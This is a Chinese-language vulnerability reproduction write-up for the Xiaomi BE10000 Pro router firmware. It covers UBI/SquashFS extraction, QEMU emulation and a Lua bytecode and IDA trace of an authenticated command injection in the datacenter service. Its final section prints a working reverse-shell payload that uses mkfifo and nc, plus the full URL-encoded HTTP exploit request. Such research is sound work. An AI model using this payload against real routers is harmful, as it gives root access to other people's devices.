# XiaomiBE10000 Pro固件模拟及漏洞复现
> 皮皮先生
> 来源：https://www.iotsec-zone.com/article/552

# 漏洞概述

**产品型号**：Xiaomi路由器BE10000 Pro 稳定版
 **固件版本**：miwifi_rp04_firmware_85be4_1.0.70.bin
 **漏洞类型**：授权后远程命令注入漏洞
 **漏洞危害**：由于未对用户输入参数进行有效过滤，已授权攻击者可构造恶意请求，最终以root权限在设备上执行任意命令。

**风险等级**：高危

**固件下载**  [https://miuirom.org/load?o=xiaomi-router-be10000-pro&v=1.0.70&l=en&t=router](https://miuirom.org/load?o=xiaomi-router-be10000-pro&v=1.0.70&l=en&t=router)

# 提取文件系统

### 分析固件

```
binwalk miwifi_rp04_firmware_85be4_1.0.70.bin
```

![0.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklwug8bb4k0dnn9jk.png)

在偏移 `752（0x2F0）` 处，识别到了一个 `UBI erase count header`，它是 UBI 镜像的头部信息。这意味着从这个位置开始，存放着一个 UBI 镜像。

```
xxd miwifi_rp04_firmware_85be4_1.0.70.bin | head -20
```

![1.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklwuom9w34k9bfvhh.png)

魔术HDR1就是小米固件头，还有下面这些可读的字符串，其中就包括了明文的版本配置啥的比如  '1.0.89'  、release

```
binwalk -Me miwifi_rp04_firmware_85be4_1.0.70.bin
```

![2.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklwuxg0hr44cztqoq.png)

有2F0.ubi 和ubifs-root文件夹 ，往这个文件夹翻找最后只有一个kernel目录，那么着重分析这个2F0.ubi

```
file 2F0.ubi
```

![3.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklwv7owwlvxqqy1fs.png)

说明是完整有效的UBI镜像

UBI 镜像由等大的 PEB 组成，每个 PEB 开头是 EC header（魔数 UBI#）。观察所有 UBI#的位置，间距就是 PEB 大小

```
strings -t x 2F0.ubi | grep "UBI#" | head -5
```

![4.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklwvfbtqeo1smcufp.png)

那么他们的间距就是0x2000 = 2x16x16x16x16=131072/1024=128，知道了PEB=128KB，用ubireader 导出卷

`ubireader_extract_images` 是 `ubireader` 工具集中的一个命令行工具，专门用于**从 UBI 镜像中提取出所有的 UBI 卷**

```
ubireader_extract_images -o images 2F0.ubi
```

![5.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklwvmx8604pcqhlom.png)

提取出俩个卷，但是经过解压都解不出来，换另一种方法，用内核挂载，但是也失败了是因为校验 CRC 不通过,我们进一步观察CRC

```
hexdump -C -n 64 2F0.ubi
```

![6.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklwvszeh4u9royt94.png)

第 60-63 字节的 CRC32 值是 0a a4 93 6e

再使用crc32验证下

```
head -c 60 2F0.ubi > 1.bin && crc32 1.bin
```

![7.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklwvy4jxragrmjybc.png)

`0a a4 93 6e` ≠ `f55b6c91` → **CRC 校验不匹配**

### CRC修复

**厂商在生成固件时，使用了非标准的打包流程或对UBI头部进行了后处理，导致头部的CRC32校验值没有根据头部内容重新计算，与标准UBI镜像规范不符。**

接下来就是修复CRC，脚本如下，整个过程就是取出每个 UBI PEB 的 EC Header 前 60 字节，用 CRC32 重算，然后把结果覆盖回后 4 字节（第 60-63 字节）

```python
import struct, zlib
data = bytearray(open('2F0.ubi','rb').read())
PEB = 131072
for peb_off in range(0, len(data), PEB):
    ec = data[peb_off:peb_off+64]
    if ec[:4] == b'UBI#':                       # 是 EC header
        vid_off = struct.unpack('>I', ec[16:20])[0]
        ec[60:64] = struct.pack('>I', zlib.crc32(ec[:60]) & 0xffffffff)
        vid = data[peb_off+vid_off:peb_off+vid_off+64]
        if vid[:4] == b'UBI!':                  # 是 VID header
            vid[60:64] = struct.pack('>I', zlib.crc32(vid[:60]) & 0xffffffff)
open('2F0_fixed.ubi','wb').write(data)
```

```
python fix.py
```

![8.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklwwdbd907yqzgbgg.png)

### 尝试提取

**nandsim 模拟 NAND 芯片**

```
sudo modprobe nandsim id_bytes=0x2c,0xda,0x00,0x15
#加载 nandsim 模拟 NAND 芯片（ID 决定参数：256MB, 2048页, 64 OOB, 128KB擦除块）
```

![9.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklwwlmzcj5mury5xp.png)

```c#
#将修复后的 UBI 镜像对齐到 PEB 边界（128KB 的整数倍）
truncate -s %131072 2F0_fixed.ubi                            
       
#写入模拟 NAND（bs=4096 对齐到页）
sudo dd if=2F0_fixed.ubi of=/dev/mtd0 bs=4096 status=progress  
sync

#附加 UBI 设备
sudo ubiattach -O 2048 -m 0 -d 0 /dev/ubi_ctrl                 

#查看卷信息   
sudo ubinfo -a
```

![10.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklwwrzf2hg8itvnei.png)

接下尝试UBIFS挂载rootfs 卷

```
sudo mount -t ubifs ubi0:ubi_rootfs /mnt/xiaomi-rootfs
```

![11.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklwx0u503wchbsmiu.png)

又报错了

```
sudo dmesg | grep ubifs
```

![12.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklwxa3w8qq4qqxkwt.png)

这说明：`ubi_rootfs` 卷内部不是 UBIFS 文件系统，而是其他格式，回头再去看看用 ubireader 导出的卷文件头

```
xxd img-1289292968_vol-ubi_rootfs.ubifs |head -1
```

![13.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklwxkffjmqavrxkd8.png)
卷里装的不是 UBIFS，而是 **SquashFS**，那么再尝试解包

```
unsquashfs -d squashfs-root img-1289292968_vol-ubi_rootfs.ubifs
```

![14.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklwy7llq00jdcozmo.png)

终于是提取出文件系统

# 启动项分析

**先看/ect/inittab**

![15.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklwygfvsu620judhz.png)

这里定义了系统启动、关机和登录

我们对启动 的 **/etc/init.d/rcs** 进一步分析，但是这没有找到

我们往下翻找 在 **etc/init.d/nginx**

![16.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklwym8pttjcvbg05a.png)

这里能看出使用了OpenWrt 的 init 脚本框架，往下start_service函数就是启动一个 **CGI 解释器**，监听本地 8920 端口，等待 nginx 转发请求过来处理。

![17.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklwyrdg9cobiy5euz.png)

![18.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklwzv2ghzpwbcrajm.png)

然后创建nginx所需目录，再调用init_config 函数，它进行动态生成配置文件

![19.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklwyxwisfnekqu44f.png)

最后启动 nginx

![20.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx03uba8vsj6gnbq.png)

简单去看一下**/etc/nginx/nginx.conf**

![21.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx08yih5sf8tfkwc.png)

跟进在**/etc/nginx/conf.d/** 观察能看到web服务启动的是nginx，网站目录是/www

![22.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx0dnzo6rmybzhnb.png)

![23.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx0jnhsw7ow9ooae.png)

这里分别监听了这么多端口,后续启动nginx服务的时候会体现出来

在 **etc/rc.d/S80datacenter**

![24.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx0puj1ow93yssvc.png)

在路由器启动时，自动恢复被用户强制关闭的插件，然后启动 `datacenter` 核心进程。

简单看了下web服务相关启动的启动项后就尝试进行模拟

# 固件模拟

![25.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx0yx445n0rdp4rh.png)

采用ARM aarch64 系统模拟

```
#系统模拟
qemu-system-aarch64 \
    -m 2048 \
    -cpu cortex-a53 \
    -M virt,virtualization=true \
    -nographic \
    -drive if=none,file=debian-12-nocloud-arm64.qcow2,format=qcow2,id=hd0 \
    -device virtio-blk-device,drive=hd0 \
    -netdev tap,id=net0,ifname=tap0,script=no,downscript=no \
    -device virtio-net-device,netdev=net0 \
    -bios /usr/share/qemu-efi-aarch64/QEMU_EFI.fd
    

#宿主机ip配置
sudo tunctl -t tap0 -u `whoami`
sudo ifconfig tap0 192.168.10.1/24 up

#aarch64虚拟机ip配置
ip link add br0 type dummy
ifconfig eth0 192.168.10.2/24
ifconfig br0 192.168.10.3/24

#宿主机压缩并传输文件
tar -cvf web.tar.gz squashfs-root/
python -m http.server

#aarch64虚拟机
wget http://192.168.10.1:8000/web.tar.gz
tar -xvf web.tar.gz

#挂载虚拟文件系统
cd squashfs-root/ 
sudo mount -t proc proc proc
sudo mount --rbind /dev dev
sudo mount -t sysfs sysfs sys

#启动服务
chroot . sh

#创建缺失的目录
mkdir -p /var/lib/nginx/body
mkdir -p /var/run

#datacenter 后端
/usr/sbin/datacenter > /tmp/datacenter.log 2>&1 &

#Web 前端
/usr/sbin/nginx -c /etc/nginx/nginx.conf &

#fcgi-cgi FastCGI 应用服务器部署
/usr/bin/spawn-fcgi -n -a 127.0.0.1 -p 8920 -F 1 -- /usr/bin/fcgi-cgi </dev/null >/tmp/fcgi.out 2>&1 &
```

![26.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx14lpugrzdopv4w.png)
web初始化配置

```
#标记初始化完成（否则 Web 强制进初始化向导）
在/etc/config/xiaoqiang 文件加上或替换 option INITTED '1'
```

![27.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx1c6gz57o9wo6wm.png)

输入admin

![28.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx1gf6f48l0r3jxl.png)

# 漏洞复现

### 漏洞分析

根据情报可知 

​	**入口点**：Web API接口 `/api/xqdatacenter`

**漏洞文件**：`/usr/lib/lua/luci/controller/api/xqdatacenter.lua`

**触发条件**：访问的API接口类型为 `request`。

#### xqdatacenter.lua分析

![29.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx1okoetixjttv0m.png)

漏洞入口文件 是 usr/lib/lua/luci/controller/api/xqdatacenter.lua ，将其丢进ida观察

![30.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx1sn4soqmaax5la.png)

一看是这个玩意，因为 xqdatacenter.lua 根本不是 CPU 可执行文件，IDA 不认它。接下来需要对其进行反编译

先看看文件头魔术

```
xxd xqdatacenter.lua |head -10
```

![31.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx1xjo96osllejhg.png)

头部是 \x1bFate/Z  我们需要将其修复回  \x1bLua

```
printf '\x1bLua' | dd of=xqdatacenter.lua bs=1 seek=0 count=4 conv=notrunc
```

![32.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx2unrlcv0roda6u.png)

```
#利用文件系统自带的luac 进行反编译成可读字节
/usr/bin/luac -l -l /usr/lib/lua/luci/controller/api/xqdatacenter.lua > xqdatacenter_bytecode.txt
```

逐步分析 xqdatacenter_bytecode.txt

```
cat xqdatacenter_bytecode.txt
```

![33.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx3kw4ko2u6ucfuz.png)

`main <?:0,0>` 就是程序的主入口 ，这个函数 69 条指令，最多用 6 个寄存器 R0~R5，常量表 23 项，它定义了 13 个子函数。

![34.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx455sgzf27bbkbh.png)

其中就发现了 tunnelRequest 漏洞函数，对其进行查找行号

```
grep -n "tunnelRequest" ./xqdatacenter_bytecode.txt
```

![35.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx4b08ebgtraeppv.png)

L32（main 的 SETGLOBAL），L44（分发器的 call 注册），常量表段（字符串常量），都不是函数头，我们再通过开始main函数入口那块看到的tunnelRequest 下面的地址去找

![36.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx4kco39x02y1xpu.png)

```
grep -n '0xffffb81360b0' xqdatacenter_bytecode.txt
```

![37.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx4tplrkomcadxuw.png)

找到完整的函数L467，查看 `tunnelRequest` 的完整代码

```
sed -n '467,508p' ./xqdatacenter_bytecode.txt
```

![38.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx4yxxbvf3gpfhje.png)

```
9	[-]	TESTSET  	3 3 -5	; "formvalue_unsafe"    #取 http.formvalue_unsafe 方法
10	[-]	GETTABLE 	4 -6	; "payload"             #参数名 "payload"
11	[-]	MOD      	3 2 0                           #调用 formvalue_unsafe("payload")
12  [-] MOD         2 0 2                           #调用 binaryBase64Enc(刚才的 payload)
这步base64加密一看就不是注入点再往下分析
14 TESTSET 3 3 -7 ; THRIFT_TUNNEL_TO_DATACENTER   	#取模板（值 = "thrifttunnel 0 '%s'"）
16 TESTSET 4 0 -8 ; exec                          	#取 exec 方法
18 MOD 4 2 2                                      	#exec(命令)
```

其中关键点在于formvalue() 会走过滤检测hackCheck，但是formvalue_unsafe()不会，这个函数主要的作用是让恶意payload-->base64--->打包成thrifttunnel 协议包(表面上是安全的)-->exec 送给 thrifttunnel，然后base64解码还原 JSON，转发 127.0.0.1:9090 也就是datacenter

接下来分析**datacenter**

#### datacenter分析

![39.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx58r176f2pwuv5f.png)

将datacenter丢进ida，然后搜索进入**formatExtDisk** 函数

![40.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx5fezsf60cks8mq.png)

这整个过程中并没有对传入的三个字段进行过滤，最终一步一步按顺序与字符串 `/usr/sbin/format_disk` 进行拼接。**最终命令**：拼接成形如 `/usr/sbin/format_disk {vendor} {type} {dev}` 的命令字符串。

那么要想进入这个函数就需要往上进行交叉引用查看什么情况下才会进来，发现当值为7的时候就会进入formatExtDisk[0]

![41.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx5jl2iepdporjs1.png)

### exp构造及复现

**攻击链总结**

恶意HTTP请求 `payload` → `xqdatacenter.lua` 接收并Base64编码 → 调用 `thrifttunnel` 解码并转发 → `datacenter` 服务解析并拼接命令 → `system()` 执行命令.

构造反弹shell

{"api":7,"dev":"a","vendor":"vuln;(rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.10.1 4444 >/tmp/f)& #","type":"a"}

先登录进去拿到有效**stok**

```http
POST /cgi-bin/luci/;stok=e31811acb1642b81f2b2441537b3fc26/api/xqdatacenter/request HTTP/1.1

Host: 192.168.10.3:8080

Cookie: __guid=57459178.3869850445544886300.1786353395763.718; psp=admin|||2|||0; monitor_count=31

Cache-Control: max-age=0

Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"

Sec-Ch-Ua-Mobile: ?0

Sec-Ch-Ua-Platform: "Linux"

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

Referer: http://192.168.10.3/cgi-bin/luci/;stok=fcc4a8f9d100247a944a19f8ef9f4ece/web/home

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Priority: u=0, i

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 410

payload=%7b%22%61%70%69%22%3a%37%2c%22%64%65%76%22%3a%22%61%22%2c%22%76%65%6e%64%6f%72%22%3a%22%76%75%6c%6e%3b%28%72%6d%20%2d%66%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%39%32%2e%31%36%38%2e%31%30%2e%31%20%34%34%34%34%20%3e%2f%74%6d%70%2f%66%29%26%20%23%22%2c%22%74%79%70%65%22%3a%22%61%22%7d
```

![42.png](https://www.iotsec-zone.com/api/image/v2/20260811/dklx5qaz5nqtwrcees.png)

复现成功

参考链接 [https://idocdown.com/app/articles/blogs/detail/18004#google_vignette](https://idocdown.com/app/articles/blogs/detail/18004#google_vignette)
